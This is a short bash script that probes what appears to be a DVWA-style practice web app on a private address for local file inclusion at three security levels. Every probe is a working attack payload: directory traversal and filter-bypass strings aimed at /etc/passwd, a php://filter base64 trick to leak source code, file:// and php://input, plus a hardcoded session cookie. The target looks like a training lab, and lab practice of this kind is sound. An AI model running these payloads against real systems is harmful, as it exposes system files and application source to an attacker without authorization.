CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/lfi

probe(){ L=$1; PG=$2
  curl -s -b "$CK; security=$L" "$B/vulnerabilities/fi/" -G --data-urlencode "page=$PG" | grep -oE '<pre>.*</pre>|root:[^\n]{0,200}|FAIL|ERROR|not allowed|no such|Interesting|include' | head -c 700
  echo " <<== [$L] page=[$PG]"
}
for L in low medium high; do
  echo "==== level=$L"
  probe "$L" "include.php"
  probe "$L" "/etc/passwd"
  probe "$L" "../../../../../../../etc/passwd"
  probe "$L" "....//....//....//....//....//....//....//etc/passwd"
  probe "$L" "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
  probe "$L" "php://filter/convert.base64-encode/resource=include.php"
  probe "$L" "file:///etc/passwd"
  probe "$L" "php://input"
done
